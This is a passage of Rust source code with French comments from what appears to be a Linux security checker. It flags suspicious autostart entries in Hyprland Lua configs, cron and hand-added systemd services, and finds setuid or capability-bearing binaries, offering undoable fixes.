                Some(JetonLua::Chaine(_) | JetonLua::Nom(_)) => fin = fin.saturating_add(1),
                _ => break,
            }
            if signe(fin, "..") {
                fin = fin.saturating_add(1);
            } else {
                break;
            }
        }
        // Suivie d'une autre valeur, d'un appel ou d'un calcul : non lue.
        let finie = match jetons.get(fin).map(|(j, _)| j) {
            None => true,
            Some(JetonLua::Nom(n)) => n != "and" && n != "or",
            Some(JetonLua::Signe(s)) => s == ";" || s == ")" || s == "}" || s == "]",
            Some(JetonLua::Chaine(_)) => false,
        };
        locales.entry(nom.clone()).or_default().push(None);
        if finie && fin > debut {
            a_relire.push((nom.clone(), debut, fin));
        }
    }
    // Chaque valeur lue remplace une valeur non lue de son nom, une seule fois.
    let mut lues = vec![false; a_relire.len()];
    for _ in 0..8 {
        let mut change = false;
        for ((nom, debut, fin), lue) in a_relire.iter().zip(lues.iter_mut()) {
            if *lue {
                continue;
            }
            let Some(formes) = valeurs_lua(jetons.get(*debut..*fin).unwrap_or_default(), &locales) else {
                continue;
            };
            let valeurs = locales.entry(nom.clone()).or_default();
            if let Some(trou) = valeurs.iter().position(Option::is_none) {
                valeurs.remove(trou);
            }
            valeurs.extend(formes.into_iter().map(Some));
            *lue = true;
            change = true;
        }
        if !change {
            break;
        }
    }
    locales
}

/// Les appels d'un fichier Lua de Hyprland qui lancent une commande ou chargent du code (`appel_lua`), lus sur
/// les jetons du fichier entier (relecture adverse, B4 et C9 : « f "…" », « f [[…]] », « f (…) », un appel sur
/// autant de lignes qu'il faut), et ce qui renomme ou redéfinit une fonction qui lance (« local e = os.execute »,
/// « function o.launch(…) »), change le chemin des modules (« package.path = … ») ou indexe « os », « io »,
/// « package », « _G » par un calcul. Lecture au mieux : Lua est un langage ; ce qui ne se lit pas est dit, jamais
/// tu (modèle de menace).
fn appels_lua(texte: &str) -> Vec<AppelLu> {
    let jetons = jetons_lua(texte);
    let ligne_de = |k: usize| jetons.get(k).map_or(0, |(_, l)| *l);
    let locales = locales_lua(&jetons);
    let mut appels = Vec::new();
    for (k, (j, l)) in jetons.iter().enumerate() {
        let JetonLua::Nom(nom) = j else { continue };
        let precedent = k.checked_sub(1).and_then(|p| jetons.get(p)).map(|(j, _)| j);
        let suivant = jetons.get(k.saturating_add(1)).map(|(j, _)| j);
        let racine = nom.trim_start_matches("_G.").trim_start_matches("_ENV.");
        // « package.path = … », « os[…] », « _G[x] » : ce qui se charge ou se lance ne se voit plus.
        let chemin_change = ["package.path", "package.cpath", "package.searchers", "package.preload"]
            .iter()
            .any(|p| racine == *p || racine.starts_with(&format!("{p}.")));
        // « hl[k](…) », « hl["exec" .. "_cmd"](…) » : une fonction de Hyprland ou d'Omarchy prise par un nom calculé
        // (vérification 2, N9).
        let global = nom_global(nom);
        let indexe = (["os", "io", "package", "_G", "_ENV", "debug"].contains(&nom.rsplit('.').next().unwrap_or(nom))
            || ["hl", "hl.dsp", "hl.plugin", "o"].contains(&global))
            && matches!(suivant, Some(JetonLua::Signe(s)) if s == "[");
        // Une bibliothèque qui lance prise comme valeur (« pairs(os) », « local h = hl ») : ce qu'on en tire ne se
        // voit plus (vérification 2, N9). Pas une comparaison ni « x or … » ; « _ENV », toujours.
        let compare = |j: Option<&JetonLua>| {
            matches!(j, Some(JetonLua::Signe(s)) if s == "==" || s == "~=")
                || matches!(j, Some(JetonLua::Nom(n)) if n == "or" || n == "and" || n == "not")
        };
        let valeur = nom == "_ENV"
            || (["os", "io", "package", "debug", "hl", "hl.dsp", "hl.plugin"].contains(&global) || nom == "_G")
                && !compare(precedent)
                && !compare(suivant);
        if chemin_change || indexe || valeur {
            appels.push(AppelLu {
                debut: *l,
                fin: *l,
                commandes: Vec::new(),
                textes: Vec::new(),
                modules: Vec::new(),
                fichiers: Vec::new(),
                non_lu: Some(code_lua_non_lu()),
            });
            continue;
        }
        let Some(sorte) = appel_lua(nom) else { continue };
        // Un champ de table (« { launch = "obsidian" } », forme des raccourcis d'Omarchy) : un nom simple suivi de
        // « = » après « { », « , » ou « ; ». Sa valeur se lit avec l'appel qui la reçoit ; ce n'est pas une
        // fonction redéfinie (« o.launch = … », nom composé, le reste).
        let champ = !nom.contains('.')
            && matches!(suivant, Some(JetonLua::Signe(s)) if s == "=")
            && matches!(precedent, Some(JetonLua::Signe(s)) if ["{", ",", ";"].contains(&s.as_str()));
        if champ {
            continue;
        }
        let ouvre = match suivant {
            Some(JetonLua::Signe(s)) if s == "(" || s == "{" => true,
            Some(JetonLua::Chaine(_)) => true,
            _ => false,
        };
        let definie = matches!(precedent, Some(JetonLua::Nom(n)) if n == "function");
        if definie || !ouvre {
            appels.push(AppelLu {
                debut: *l,
                fin: *l,
                commandes: Vec::new(),
                textes: Vec::new(),
                modules: Vec::new(),
                fichiers: Vec::new(),
                non_lu: Some(fonction_lua_renommee()),
            });
            continue;
        }
        let (arguments, fin): (Vec<&[(JetonLua, usize)]>, usize) = match suivant {
            Some(JetonLua::Signe(s)) if s == "(" => {
                let fin = fermeture_lua(&jetons, k.saturating_add(1));
                (
                    elements_lua(jetons.get(k.saturating_add(2)..fin).unwrap_or_default()),
                    fin,
                )
            }
            Some(JetonLua::Signe(_)) => {
                let fin = fermeture_lua(&jetons, k.saturating_add(1));
                (vec![jetons.get(k.saturating_add(1)..=fin).unwrap_or_default()], fin)
            }
            _ => (
                vec![
                    jetons
                        .get(k.saturating_add(1)..=k.saturating_add(1))
                        .unwrap_or_default(),
                ],
                k.saturating_add(1),
            ),
        };
        let mut appel = AppelLu {
            debut: *l,
            fin: ligne_de(fin),
            commandes: Vec::new(),
            textes: Vec::new(),
            modules: Vec::new(),
            fichiers: Vec::new(),
            non_lu: None,
        };
        match sorte {
            AppelLua::Code => appel.non_lu = Some(code_lua_non_lu()),
            AppelLua::Lance | AppelLua::Raccourci => {
                // Le premier argument d'un raccourci nomme ses touches (« mod .. " + " .. i » dans une boucle), et
                // le deuxième d'un « o.bind(touches, description, action) » d'Omarchy (trois arguments ou plus, pas
                // « hl.bind(touches, action, options) ») sa description : jugés s'ils se lisent, sans constat sinon ;
                // rien ne les lance. Un « bind » redéfini dans un fichier lu est levé à part (`fonction_lua_renommee`).
                let description = sorte == AppelLua::Raccourci && arguments.len() >= 3 && !racine.starts_with("hl.");
                // Vérification 3 : le seul argument qui se lance passe la liste permise ; les autres (règles de
                // fenêtre d'« exec_cmd(c, règles) », mode d'« io.popen(c, "r") », motif de « launch_sole(motif, c) »,
                // options d'un raccourci) ne sont que du texte, jugé par ses mots. Les aides d'applications web
                // rendent la commande d'Omarchy (helpers.lua), chaque argument entre guillemets simples.
                let fin_du_nom = racine.rsplit('.').next().unwrap_or(racine);
                let web = match fin_du_nom {
                    "launch_webapp" => Some("omarchy-launch-webapp"),
                    "launch_webapp_sole" => Some("omarchy-launch-or-focus-webapp"),
                    _ => None,
                };
                if let Some(programme) = web {
                    let mut mots = vec![programme.to_string()];
                    let lu = arguments.iter().all(|a| {
                        let mut v = Vec::new();
                        let lu = litterale_lua(a) && element_lu(a, &locales, &mut v);
                        match v.as_slice() {
                            [seul] if lu => {
                                mots.push(format!("'{}'", seul.replace('\'', "'\\''")));
                                true
                            }
                            _ => false,
                        }
                    });
                    if lu {
                        appel.commandes.push(mots.join(" "));
                    } else {
                        appel.non_lu = Some(commande_lua_non_lue());
                    }
                } else {
                    let lance = match (sorte, fin_du_nom) {
                        (AppelLua::Raccourci, _) => {
                            if description {
                                2
                            } else {
                                1
                            }
                        }
                        (_, "launch_sole") => 1,
                        _ => 0,
                    };
                    let lus = arguments
                        .iter()
                        .enumerate()
                        .filter(|(k, a)| {
                            // Lu d'abord : ses mots se jugent même pour les touches.
                            let sans_lancement = *k != lance;
                            let lu = if sans_lancement {
                                element_lu(a, &locales, &mut appel.textes)
                            } else {
                                litterale_lua(a) && element_lu(a, &locales, &mut appel.commandes)
                            };
                            !(lu || sans_lancement)
                        })
                        .count();
                    if lus > 0 {
                        appel.non_lu = Some(commande_lua_non_lue());
                    }
                }
            }
            AppelLua::Fichier => match arguments.first().and_then(|c| valeurs_lua(c, &locales)) {
                Some(chemins) => {
                    appel.textes.extend(chemins.iter().cloned());
                    appel.fichiers = chemins;
                }
                None => appel.non_lu = Some(code_lua_non_lu()),
            },
            AppelLua::Module => match arguments.first().and_then(|a| valeurs_lua(a, &locales)) {
                Some(noms) => appel.modules = noms,
                None => appel.non_lu = Some(code_lua_non_lu()),
            },
        }
        if appel.non_lu.is_some()
            || !appel.commandes.is_empty()
            || !appel.textes.is_empty()
            || !appel.modules.is_empty()
        {
            appels.push(appel);
        }
    }
    appels
}

/// Les variables de Hyprland (« $nom = valeur ») posées dans ses fichiers lus, chaque valeur écrite pour chaque nom,
/// lignes jointes comme hyprlang (`lignes_de_hyprlang`) : Hyprland les remplace dans une ligne avant de la lire.
/// Tout nom que hyprlang accepte (relecture adverse, B2 : « $HOME-x », « $a b ») : ce qui est entre « $ » et « = ».
fn variables_de_hypr<'a>(
    fichiers: impl Iterator<Item = &'a std::path::PathBuf>,
) -> std::collections::BTreeMap<String, Vec<String>> {
    let mut variables: std::collections::BTreeMap<String, Vec<String>> = std::collections::BTreeMap::new();
    for f in fichiers {
        let Ok(lu) = temoins::lire_borne(f, LECTURE_MAX) else {
            continue;
        };
        for (_, _, l) in lignes_de_hyprlang(&String::from_utf8_lossy(&lu.octets)) {
            let Some((nom, valeur)) = l.trim_start().strip_prefix('$').and_then(|r| r.split_once('=')) else {
                continue;
            };
            let nom = nom.trim();
            if nom.is_empty() {
                continue;
            }
            // « # » commence un commentaire, « ## » l'écrit.
            let valeur = if valeur.contains("##") {
                valeur.replace("##", "#")
            } else {
                valeur.split('#').next().unwrap_or_default().to_string()
            };
            variables
                .entry(nom.to_string())
                .or_default()
                .push(valeur.trim().to_string());
        }
    }
    variables
}

/// Au plus autant de formes d'une commande aux variables remplacées : au-delà, elle ne se juge pas.
const FORMES_MAX: usize = 32;

/// Les formes que prend la `commande` d'une ligne de Hyprland une fois ses variables remplacées (chaque valeur
/// posée, le nom le plus long d'abord, comme Hyprland), ou `None` : une variable reste sans valeur connue (seul
/// $HOME, que le shell connaît, peut rester), une boucle, ou trop de formes.
fn resoudre_hypr(commande: &str, variables: &std::collections::BTreeMap<String, Vec<String>>) -> Option<Vec<String>> {
    let nom_de = |reste: &str| -> usize {
        reste
            .bytes()
            .take_while(|b| b.is_ascii_alphanumeric() || *b == b'_')
            .count()
    };
    let mut a_faire = vec![(commande.to_string(), 0_u32)];
    let mut formes = Vec::new();
    while let Some((c, profondeur)) = a_faire.pop() {
        // La première variable de Hyprland de la commande : le plus long nom posé qui suit « $ », quelles que soient
        // ses lettres ; une variable posée l'emporte sur celle de l'environnement (relecture adverse, B2).
        let trouvee = c.match_indices('$').find_map(|(i, _)| {
            let reste = c.get(i.checked_add(1)?..)?;
            variables
                .iter()
                .filter(|(nom, _)| reste.starts_with(nom.as_str()))
                .max_by_key(|(nom, _)| nom.len())
                .map(|(nom, valeurs)| (i, nom.len(), valeurs))
        });
        if let Some((i, longueur, valeurs)) = trouvee {
            if profondeur >= 8 {
                return None;
            }
            for v in valeurs {
                let fin = i.checked_add(1)?.checked_add(longueur)?;
                let forme = format!("{}{v}{}", c.get(..i)?, c.get(fin..)?);
                a_faire.push((forme, profondeur.saturating_add(1)));
            }
        } else {
            let reste_inconnu = c.match_indices('$').any(|(i, _)| {
                let apres = c.get(i.saturating_add(1)..).unwrap_or_default();
                let n = nom_de(apres);
                !(apres.get(..n) == Some("HOME") || apres.starts_with("{HOME}"))
            });
            if reste_inconnu {
                return None;
            }
            formes.push(c);
        }
        if formes.len().saturating_add(a_faire.len()) > FORMES_MAX {
            return None;
        }
    }
    Some(formes)
}

/// La commande d'une ligne de cron, sans son horaire (« @reboot » ou cinq champs) ni, dans un fichier du système, le
/// compte qui la lance. Coupée comme la coupe cron : espace et tabulation.
fn commande_de_cron(l: &str, systeme: bool) -> String {
    let l = l.trim_matches([' ', '\t']);
    let champs: usize = match (l.starts_with('@'), systeme) {
        (true, false) => 1,
        (true, true) => 2,
        (false, false) => 5,
        (false, true) => 6,
    };
    l.split([' ', '\t'])
        .filter(|m| !m.is_empty())
        .skip(champs)
        .collect::<Vec<_>>()
        .join(" ")
}

/// La crontab du compte et celles du système : chaque ligne est une commande.
fn juger_cron(racine: &Path, crontab: Option<String>, t: &mut Lancements) {
    let etc = |chemin: &str| racine.join(chemin);
    let crontab = crontab.unwrap_or_default();
    // La crontab du compte n'a pas de fichier qu'un geste de défense toucherait ; son texte entier est son témoin.
    for (n, l) in crontab.lines().enumerate().filter(|(_, l)| !commentaire(l)) {
        if let Some(raison) = commande_suspecte(l, false) {
            t.sources.push(source_de("crontab", l));
            t.retraits.push(None);
            let numero = n.saturating_add(1);
            // Hors du périmètre déclarable : la crontab du compte.
            t.temoins.push(Err(hors_des_deux(&format!("crontab:{numero}"))));
            t.suspects.push(trf!("crontab : {raison}", "crontab: {raison}"));
        }
    }
    let mut fichiers_cron = vec![etc("etc/crontab")];
    fichiers_cron.extend(
        std::fs::read_dir(etc("etc/cron.d"))
            .into_iter()
            .flatten()
            .flatten()
            .map(|e| e.path()),
    );
    let h = t.r.maison.clone();
    for f in fichiers_cron {
        let Some(lu) = lire(&f, &h, t) else {
            continue;
        };
        let source = crate::ui::chemin_affichable(&f);
        for (n, l) in lu.texte.lines().enumerate().filter(|(_, l)| !commentaire(l)) {
            if let Some(raison) = commande_suspecte(l, false) {
                t.sources.push(source_de(&crate::modele::id::chemin(&source), l));
                t.retraits.push(retrait(&f, &lu.texte, l));
                let d = designes::commande(&commande_de_cron(l, true), designes::Contexte::Shell);
                let temoin = temoin_de_ligne(t, &f, n, &lu, l, d, true, Sorte::Shell);
                t.temoins.push(temoin);
                t.suspects.push(trf!("{source} : {raison}", "{source}: {raison}"));
            }
        }
    }
}

/// Le constat des lancements : aucun suspect, ou une alerte (critique si une bibliothèque hors paquet est préchargée)
/// qui en nomme six au plus.
fn constat_des_lancements(t: Lancements) -> Constat {
    const CAT: &str = "Persistance";
    let Lancements {
        critiques,
        mut suspects,
        sources,
        mut retraits,
        temoins: releves,
        ..
    } = t;
    suspects.sort();
    suspects.dedup();
    if critiques.is_empty() && suspects.is_empty() {
        return ok(
            CAT,
            tr!(
                "Aucun lancement automatique suspect (préchargement, services, démarrage de session, cron).",
                "No suspicious autostart (preloading, services, session startup, cron)."
            ),
        );
    }
    let niveau = if critiques.is_empty() {
        Niveau::Eleve
    } else {
        Niveau::Critique
    };
    let mut liste = critiques;
    liste.extend(suspects);
    let total = liste.len();
    let suite = liste.split_off(liste.len().min(LIGNES_MONTREES));
    let mut message = trf!(
        "Lancement automatique suspect ({total} ligne(s)) : {}",
        "Suspicious autostart ({total} line(s)): {}",
        liste.join(" ; ")
    );
    if !suite.is_empty() {
        let _ = trw!(
            message,
            " ; et {} autre(s), par fichier : {}",
            "; and {} more, by file: {}",
            suite.len(),
            reste_par_fichier(&suite)
        );
    }
    message.push('.');
    let constat = alerte(CAT, niveau, message).avec_objet(objet_des_lancements(sources)).manuel(
        tr!("Ne rien lancer : lire chaque ligne signalée et supprimer celles que vous n'avez pas ajoutées, puis lancer l'antivirus", "Do not run anything: read each reported line and delete the ones you did not add, then run the antivirus"),
        &[],
    );
    // Par des gestes de défense seulement si chaque ligne signalée est dans un fichier du système qu'un geste a le
    // droit de modifier : une ligne du dossier personnel, de la crontab du compte ou une variable de la session
    // laisse tout à la main (une correction qui en ferait une partie se croirait complète).
    retraits.dedup();
    let mut vus: Vec<&(String, String)> = Vec::new();
    let mut a_la_main = false;
    for r in &retraits {
        match r {
            Some(r) if !vus.contains(&r) => vus.push(r),
            Some(_) => {}
            None => a_la_main = true,
        }
    }
    let gestes = if a_la_main {
        Vec::new()
    } else {
        crate::machine::defense::tous(vus, |(f, l)| crate::machine::defense::retirer_ligne(f, l))
    };
    crate::machine::defense::corriger(
        constat,
        tr!(
            "Retirer ces lignes (chaque fichier est gardé entier dans sa note, Défaire le remet), puis lancer l'antivirus",
            "Remove these lines (each file is kept whole in its note, Undo puts it back), then run the antivirus"
        ),
        &gestes,
    )
    .avec_temoins(temoins::Temoins::de(releves))
}

/// Au plus autant de lignes signalées montrées en entier dans l'alerte des lancements ; les autres, par fichier.
const LIGNES_MONTREES: usize = 6;

/// Le fichier d'une ligne signalée (« ~/x.lua:12 : … » → « ~/x.lua ») ; `None` sans numéro de ligne.
fn fichier_signale(ligne: &str) -> Option<&str> {
    let octets = ligne.as_bytes();
    ligne.match_indices(':').find_map(|(i, _)| {
        let apres = octets.get(i.saturating_add(1)..)?;
        let chiffres = apres.iter().take_while(|c| c.is_ascii_digit()).count();
        (chiffres > 0 && matches!(apres.get(chiffres), Some(b' ' | b':')))
            .then(|| ligne.get(..i))
            .flatten()
    })
}

/// Les lignes signalées au-delà des premières, groupées par fichier avec leur nombre (une ligne sans fichier,
/// en entier) : une ligne de plus dans un fichier déjà signalé change son nombre, un fichier de plus se nomme
/// (deuxième vérification : « et 56 autre(s) » cachait la 63e).
fn reste_par_fichier(suite: &[String]) -> String {
    let mut fichiers: Vec<(&str, usize)> = Vec::new();
    let mut seules: Vec<&str> = Vec::new();
    for l in suite {
        match fichier_signale(l) {
            Some(f) => match fichiers.iter_mut().find(|(g, _)| *g == f) {
                Some((_, n)) => *n = n.saturating_add(1),
                None => fichiers.push((f, 1)),
            },
            None => seules.push(l),
        }
    }
    fichiers.sort_unstable();
    let mut morceaux: Vec<String> = fichiers.into_iter().map(|(f, n)| format!("{f} ({n})")).collect();
    morceaux.extend(seules.into_iter().map(str::to_string));
    morceaux.join(", ")
}

/// Services système ajoutés à la main : souvent les tiens (scripts maison), parfois une persistance root. On les nomme
/// pour que tu les reconnaisses, sans baisser la note.
fn services_ajoutes(racine: &Path, gestion: Option<Paquets>, r: &mut Releveur) -> Option<Constat> {
    let gestion = gestion?;
    let systeme = racine.join("etc/systemd/system");
    let mut fichiers: Vec<std::path::PathBuf> = fichiers_de(&systeme, &["service", "timer"])
        .into_iter()
        .filter(|p| p.parent() == Some(systeme.as_path()) && !p.is_symlink())
        .filter(|p| !gestion.possede(p))
        .collect();
    fichiers.sort();
    let ajoutes: Vec<String> = fichiers
        .iter()
        .filter_map(|p| p.file_name().map(|n| n.to_string_lossy().into_owned()))
        .collect();
    // Un choix « normal » est lié au contenu de chaque fichier de service, à ce qu'il lance et à ses ajouts :
    // changé, l'information revient.
    let mut releves = Vec::with_capacity(fichiers.len());
    for f in &fichiers {
        let temoin = if releves.len() >= temoins::TEMOINS_MAX {
            Err(temoins::Refus(trf!(
                "plus de {} services ajoutés, plus que ceux qui se montrent avant un tel choix",
                "more than {} added services, more than can be shown before such a choice",
                temoins::TEMOINS_MAX
            )))
        } else {
            temoin_de_service(r, f)
        };
        releves.push(temoin);
    }
    // Seulement depuis la vraie racine : les noms d'une arborescence fabriquée ne désignent rien de cet ordinateur.
    juger_services_ajoutes(&ajoutes, racine == Path::new("/")).map(|c| c.avec_temoins(temoins::Temoins::de(releves)))
}

/// Le témoin d'un service système ajouté à la main : son fichier, chaque programme que lancent ses lignes « Exec… »
/// (`designes`, comme une unité du système), et ses ajouts (`unite`).
fn temoin_de_service(r: &mut Releveur, f: &Path) -> Result<temoins::Temoin, temoins::Refus> {
    let montre = crate::ui::chemin_affichable(f);
    let lu = temoins::lire_borne(f, AJOUT_MAX)
        .map_err(|e| temoins::Refus(trf!("{montre} ne se lit pas ({e})", "{montre} cannot be read ({e})")))?;
    if !lu.entier {
        return Err(temoins::Refus(trf!(
            "{montre} est trop gros pour être relu à chaque bilan",
            "{montre} is too large to be re-read at each check"
        )));
    }
    let (Ok(texte), Some(_)) = (std::str::from_utf8(&lu.octets), f.to_str()) else {
        return Err(octet_refuse(&montre));
    };
    let mut cibles_liees = Vec::new();
    for l in texte.lines() {
        let Some((commande, _)) = commande_lancee_lue(l) else {
            continue;
        };
        let d = designes::commande(&commande, designes::Contexte::Unite(None));
        cibles_liees.extend(cibles(r, d, l, true)?);
    }
    // Les lignes Exec du fichier sont liées ci-dessus ; `unite` lie celles de ses ajouts.
    cibles_liees.extend(unite(r, f, texte, false, None)?);
    cibles_liees.push(environnement_lie(r)?);
    let nom = f
        .file_name()
        .map(|n| n.to_string_lossy().into_owned())
        .unwrap_or_default();
    Ok(temoins::temoin(
        &f.to_string_lossy(),
        montre,
        &nom,
        Some(&temoins::etat_du_contenant(f, &lu.octets)?),
        &cibles_liees,
    ))
}

/// `ajoutes` : les noms de fichier tels que lus (triés). `gestes` : désactiver chacun par un geste de défense, chacun
/// demandé à part sur le terminal ; jamais une unité de session (connexion à distance, écran de connexion), que
/// l'enfant root refuserait. Un nom qu'un geste ne porte pas (forgé, gabarit) laisse tout à la main.
fn juger_services_ajoutes(ajoutes: &[String], gestes: bool) -> Option<Constat> {
    const CAT: &str = "Persistance";
    let affiches: Vec<String> = ajoutes.iter().map(|n| crate::ui::affichable(n)).collect();
    let premier = affiches.first()?.clone();
    let constat = alerte(
        CAT,
        Niveau::Info,
        trf!(
            "{} service(s) système ajouté(s) à la main, hors paquet : {}. À reconnaître.",
            "{} system service(s) added by hand, not from a package: {}. Check that you recognize them.",
            affiches.len(),
            affiches.join(", ")
        ),
    )
    .avec_objet(crate::modele::Objet::de("services", &affiches.join(",")))
    .manuel(
        tr!(
            "Si vous n'en reconnaissez pas un, lisez ce qu'il lance avant de le désactiver",
            "If you do not recognize one, read what it starts before turning it off"
        ),
        &[&format!("systemctl cat {}", crate::commande::sh_chaine(&premier))],
    );
    if !gestes {
        return Some(constat);
    }
    let gestes = crate::machine::defense::tous(
        ajoutes.iter().filter(|n| !gestes_unix::unite_portant_les_sessions(n)),
        |n| gestes_unix::NomUnite::nouveau(n).map(Defense::DesactiverService),
    );
    Some(crate::machine::defense::corriger(
        constat,
        tr!(
            "Désactiver ceux que vous ne reconnaissez pas (chacun demandé à part ; Défaire les remet) ; « systemctl cat <service> » montre ce qu'il lance",
            "Turn off the ones you do not recognize (each asked separately; Undo puts them back); “systemctl cat <service>” shows what it starts"
        ),
        &gestes,
    ))
}

/// Fichiers listés par « getcap -r » : « /usr/bin/ping cap_net_raw=ep » (ancien format : « /usr/bin/ping = cap_net_raw+ep »).
pub(super) fn fichiers_capacites(texte: &str) -> Vec<std::path::PathBuf> {
    texte
        .lines()
        .filter_map(|l| l.split_once(" = ").or_else(|| l.rsplit_once(' ')))
        .filter(|(f, caps)| f.starts_with('/') && caps.contains("cap_"))
        .map(|(f, _)| std::path::PathBuf::from(f))
        .collect()
}

/// Programmes privilégiés (setuid, setgid, capacités : lancés avec des droits que l'utilisateur n'a pas) là où il ne
/// devrait pas y en avoir, qui n'appartiennent à aucun paquet ou qui ont changé depuis leur installation ; et PATH piégeable.
/// Les fichiers de `d`, jusqu'à `profondeur` sous-dossiers plus bas, qui passent `test`.
fn parcourir(d: &Path, profondeur: u32, trouve: &mut Vec<std::path::PathBuf>, test: &dyn Fn(&Path) -> bool) {
    for e in std::fs::read_dir(d).into_iter().flatten().flatten() {
        let p = e.path();
        if e.file_type().is_ok_and(|t| t.is_dir()) {
            if profondeur > 0 {
                parcourir(&p, profondeur.saturating_sub(1), trouve, test);
            }
        } else if test(&p) {
            trouve.push(p);
        }
    }
}

/// Programmes privilégiés (setuid, setgid, capacités : lancés avec des droits que l'utilisateur n'a pas) là où il ne
/// devrait pas y en avoir, qui n'appartiennent à aucun paquet ou qui ont changé depuis leur installation ; et PATH piégeable.
pub(super) fn fichiers_suspects() -> Vec<Constat> {
    use std::os::unix::fs::MetadataExt;
    use std::os::unix::fs::PermissionsExt;
    let (mut anormaux, systeme, capacites) = programmes_privilegies();
    let gestion = Paquets::detecter();
    let (modifies, non_verifies) =
        gestion.map_or((Vec::new(), 0), |g| comparer_aux_paquets(g, &systeme, &mut anormaux));
    let mode = |p: &Path| std::fs::symlink_metadata(p).ok().map(|m| m.mode());
    let caps = capacites.as_deref().unwrap_or_default();
    let chemins_modifies: Vec<std::path::PathBuf> = modifies.iter().map(|(p, _)| p.clone()).collect();
    let gestes_modifies = gestes_de_privilegies(&chemins_modifies, caps, mode);
    let gestes_anormaux = gestes_de_privilegies(&anormaux, caps, mode);
    let modifies: Vec<(String, String)> = modifies
        .into_iter()
        .map(|(p, paquet)| (crate::ui::chemin_affichable(&p), paquet))
        .collect();
    let reinstaller = {
        let mut paquets: Vec<&str> = modifies.iter().map(|(_, p)| p.as_str()).collect();
        paquets.dedup();
        gestion.map(|g| g.reinstaller(&paquets.join(" "))).unwrap_or_default()
    };
    let path = std::env::var("PATH").unwrap_or_default();
    let path_dangereux = path_dangereux(&path, |d| std::fs::metadata(d).ok().map(|m| m.permissions().mode()));
    juger_fichiers_suspects(&Releve {
        modifies,
        anormaux,
        systeme: systeme.len(),
        gestion: gestion.is_some(),
        non_verifies,
        capacites_lues: capacites.is_some(),
        path_dangereux,
        reinstaller,
        gestes_modifies,
        gestes_anormaux,
    })
}

/// Les gestes qui retirent leurs droits à ces programmes : le setuid/setgid de ceux qui l'ont (`mode`, lu sans
/// suivre de lien), les capacités de ceux que getcap a listés (`capacites`, chemins réels). Tous ou aucun : un chemin
/// qu'un geste ne porte pas, un programme qui n'a plus rien de privilégié (changé depuis le parcours), ou plus de
/// `defense::GESTES_MAX` gestes, et la liste reste à la main. L'enfant root rejuge chacun (paquet, chemin, sudo, su
/// et pkexec) avant de rien faire.
fn gestes_de_privilegies(
    chemins: &[std::path::PathBuf],
    capacites: &[std::path::PathBuf],
    mode: impl Fn(&Path) -> Option<u32>,
) -> Vec<Defense> {
    use std::os::unix::ffi::OsStrExt;
    let mut gestes = Vec::new();
    for p in chemins {
        let Some(c) = gestes_unix::CheminDesigne::nouveau(p.as_os_str().as_bytes()) else {
            return Vec::new();
        };
        let setuid = mode(p).is_some_and(|m| m & 0o6000 != 0);
        let reel = std::fs::canonicalize(p).unwrap_or_else(|_| p.clone());
        let caps = capacites.iter().any(|k| k == p || *k == reel);
        if !setuid && !caps {
            return Vec::new();
        }
        if setuid {
            gestes.push(Defense::RetirerSetuid(c));
        }
        if caps {
            gestes.push(Defense::RetirerCapacites(c));
        }
    }
    if gestes.len() > crate::machine::defense::GESTES_MAX {
        return Vec::new();
    }
    gestes
}

/// Les programmes privilégiés relevés : ceux des dossiers temporaires et personnels qui donnent des droits (setuid à un
/// autre compte, setgid du groupe root), ceux des dossiers du système (chemin réel, sans doublon), et ceux à capacités
/// (tels que getcap les nomme, puis par leur chemin réel ; `None` : getcap n'a pas répondu).
#[allow(
    clippy::type_complexity,
    reason = "trois listes rendues d'un seul parcours, nommées par la doc"
)]
fn programmes_privilegies() -> (
    Vec<std::path::PathBuf>,
    Vec<std::path::PathBuf>,
    Option<Vec<std::path::PathBuf>>,
) {
    use std::os::unix::fs::{MetadataExt, PermissionsExt};
    // Propriétaire du processus, lu sur /proc/self (sans dépendance à la libc).
    let moi = std::fs::metadata("/proc/self").map_or(u32::MAX, |m| m.uid());
    // Dans un dossier temporaire ou personnel, un setuid à soi ne donne aucun droit de plus ; un setuid à un autre
    // compte (root) ou un setgid du groupe root, si.
    let dangereux_hors_systeme = |p: &Path| {
        p.symlink_metadata().is_ok_and(|m| {
            m.is_file()
                && ((m.permissions().mode() & 0o4000 != 0 && m.uid() != moi)
                    || (m.permissions().mode() & 0o2000 != 0 && m.gid() == 0))
        })
    };
    let privilegie = |p: &Path| {
        p.symlink_metadata()
            .is_ok_and(|m| m.is_file() && m.permissions().mode() & 0o6000 != 0)
    };
    // Capacités (setcap) : droits root partiels, invisibles dans « ls -l ». Poser une capacité demande root.
    // Lancé tout de suite, en même temps que les parcours : getcap relit tout /usr/lib (0,6 s).
    // Par son chemin : sous Debian, /usr/sbin n'est pas dans le PATH d'un compte ordinaire, et getcap n'y serait
    // jamais trouvé (les capacités jamais lues).
    let capacites = std::thread::spawn(|| {
        let getcap = crate::commande::outil_systeme("getcap")?;
        sortie(
            &getcap.to_string_lossy(),
            &[
                "-r",
                "/usr/bin",
                "/usr/sbin",
                "/usr/local",
                "/usr/lib",
                "/usr/libexec",
                "/opt",
                "/tmp",
                "/var/tmp",
                "/dev/shm",
            ],
        )
        .map(|s| fichiers_capacites(&s))
    });
    let mut anormaux = Vec::new();
    for (d, prof) in [("/tmp", 3), ("/var/tmp", 3), ("/dev/shm", 3), (home().as_str(), 2)] {
        parcourir(Path::new(d), prof, &mut anormaux, &dangereux_hors_systeme);
    }
    // Dans les dossiers système : chaque setuid ou setgid doit venir d'un paquet, et être intact.
    let mut systeme = Vec::new();
    for (d, prof) in [
        ("/usr/bin", 0),
        ("/usr/sbin", 0),
        ("/usr/local/bin", 0),
        ("/usr/local/sbin", 0),
        ("/usr/lib", 2),
        ("/usr/libexec", 2),
        ("/opt", 3),
    ] {
        parcourir(Path::new(d), prof, &mut systeme, &privilegie);
    }
    let capacites = capacites.join().ok().flatten();
    for p in capacites.iter().flatten() {
        if ["/tmp/", "/var/tmp/", "/dev/shm/"].iter().any(|d| p.starts_with(d)) {
            anormaux.push(p.clone());
        } else if !systeme.contains(p) {
            systeme.push(p.clone());
        }
    }
    // /usr/sbin est un lien vers /usr/bin sur Arch : chemin réel (celui que connaît le paquet), sans doublon.
    let mut systeme: Vec<std::path::PathBuf> = systeme
        .into_iter()
        .map(|p| std::fs::canonicalize(&p).unwrap_or(p))
        .collect();
    systeme.sort();
    systeme.dedup();
    let capacites = capacites.map(|v| {
        let mut tous: Vec<std::path::PathBuf> = v.iter().filter_map(|p| std::fs::canonicalize(p).ok()).collect();
        tous.extend(v);
        tous
    });
    (anormaux, systeme, capacites)
}

/// Chaque programme privilégié du système comparé à son paquet : ceux d'aucun paquet rejoignent `anormaux` ; rend les
